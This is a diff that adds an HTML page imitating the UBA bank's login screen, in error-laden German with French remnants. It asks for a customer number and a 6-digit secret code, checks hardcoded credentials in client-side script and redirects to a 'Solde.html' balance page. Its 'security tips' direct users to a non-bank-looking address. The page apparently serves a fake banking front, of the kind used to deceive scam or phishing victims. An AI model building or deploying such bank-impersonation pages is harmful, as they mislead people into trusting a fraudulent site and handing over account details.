@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Connexion - UBA</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<meta charset="utf-8"/>
+
+<meta name="description" content="Entdecken Sie die Angebote und Dienstleistungen der uba bank: Bankkonto, Lebensversicherung, Sparen, Geldanlage, Rente, Wohnen, Vorsorge, Konsumkredit oder ..."/>
+
+
+<link rel="shortcut icon" type="https://cdn.vanguardngr.com/wp-content/uploads/2020/01/UBA-logo-2.gif"/>
+
+<script src='https://kit.fontawesome.com/a076d05399.js' crossorigin='anonymous'></script>
+		<link rel="preconnect" href="https://fonts.googleapis.com"> 
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> 
+<link href="https://fonts.googleapis.com/css2?family=Dosis:wght@500&display=swap" rel="stylesheet">
+		<link href="https://www.fonts.com/font/yellow-design-studio/veneer-clean" />
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+   		 <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+	  
+<link rel="stylesheet" type="text/css" href="Style.css"/>
+
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+
+<script type="text/javascript" src="Java.js"></script>
+
+
+<style>
+	#text{
+		color:rgb(230, 13, 13);
+		padding: 10px;
+		width: 100%;
+margin:0px;
+line-height:inherited;
+font-size:20px;
+	}
+</style>
+
+	</head>
+	<body>
+	<div class="navbar">
+	<img src="https://cdn.vanguardngr.com/wp-content/uploads/2020/01/UBA-logo-2.gif"></a>
+	</div>
+	
+	<form>
+	<div class="slog">
+	<h1>ZUGRIFF AUF MEINEN<br/>KONTO</h1>
+<div id="text">
+</div>
+	<div class="log">
+	<label><strong>1. Kundennummer </strong><br/>
+	<input type="tel" class="number" id="i" maxlength="10"></label><br/>
+	<label><strong>2. Mein Geheimcode (6 Ziffern)</strong><br/>
+	<input type="password" readonly="true" pattern="[0-9]*" inputmode="numeric" maxlength="6" class="pass" id="o" onclick="dlt()"></label>
+	
+	<div class="tab">
+	<table class="car">
+	<tr>
+
+	<td><button type="button" class="y" onclick="a()">0</button></td>
+
+	<td><button type="button" class="y" onclick="b()">1</button></td>
+
+	<td><button type="button" class="y" onclick="c()">2</button></td>
+
+	<td><button type="button" class="y" onclick="d()">3</button></td>
+
+	<td><button type="button" class="y" onclick="e()">4</button></td>
+	</tr>
+
+
+	<tr>
+	<td><button type="button" class="y" 
+onclick="f()">5</button></td>
+
+	<td><button type="button" class="y" onclick="g()">6</button></td>
+
+	<td><button type="button" class="y" onclick="h()">7</button></td>
+
+	<td><button type="button" class="y" onclick="z()">8</button></td>
+
+	<td><button type="button" class="y" onclick="j()">9</button></td>
+
+	</tr>
+	</table>
+	</div>
+	
+	
+	
+	
+	<button type="button" onclick="valid()" class="b"><strong>Zugang zu meinen Rechnungen</strong></button>
+	</div>
+	</div>
+	</form>
+	
+	<div class="info">
+	<p><strong>Ihre Zugangsdatend</strong></p>
+	<a href="">ihre Zugangsdaten erhalten<br/></a>
+<a href=""> Geheimcode vergessen</a><br/><br/>
+
+	</div>
+	<div class="suite">
+<hr style="color:#C0C0C0">
+	<p><strong>Sicherheitstipps</strong></p>
+	<p>überprüfen, ob die Adresse der Website mit beginnt:</p>
+<br />
+<p>https://mon-compteUBA</p>
+<br />
+<p>ein Vorhängeschloss-Symbol vorangestellt und enthält ein <strong>https://</strong>die eine sichere Verbindung garantieren werden</p>
+<a href="#">Entdecken Sie unsere Sicherheitstipps</a><p>Und gute Praktiken für die Konsultation und<br/>die Gefahren des Internets erkennen.</p>
+<hr style="color:#C0C0C0">
+<p</strong>Für eine bessere Zugänglichkeit</strong></p><br/>
+<a href="#">loggen Sie sich ein</a><p>Dank des kontrastreichen Gitters vergrößern Sie die Ansicht und profitieren von der Sprachbegleitung.</p><br/>
+<a href="#">utilisez facil'iti</a><p>Um die Anzeige an Ihre Situation anzupassen (Sehbehinderung und kognitive Beeinträchtigung).</p><br/>
+<hr style="color:#C0C0C0">
+<p><strong>Kundeninformationen</strong></p>
+<p>Sie technische Probleme beim Surfen haben, bitten wir Sie, sich an unsere Online-Berater zu wenden unter :<br/>
+
+oder uns ein technisches Problem zu melden.
+Sie können Ihre Konten auch von Ihrem Handy oder Tablet aus über die App Meine Konten verwalten..</p>
+	</div>
+	
+	
+	
+<!--	<footer>
+<center><p style="color:white;font-weight:500;">suivez-nous sur:</p></center>-->
+<div class="follow">
+
+</div>
+
+<script>
+		function valid(){
+			var x =document.querySelector(".number");
+			var y =document.querySelector(".pass");
+			if(x.value!="" && y.value!=""){
+			if(x.value==9253893262 && y.value==636822){
+				window.location="Solde.html";
+			}else{
+				/*document.getElementById("text").innerHTML="acces incorect verifier vos acces et reesayer";*/
+alert3();
+			}
+		}}
+	</script>
+
+	
+	</footer>
+	</body>
+</html>
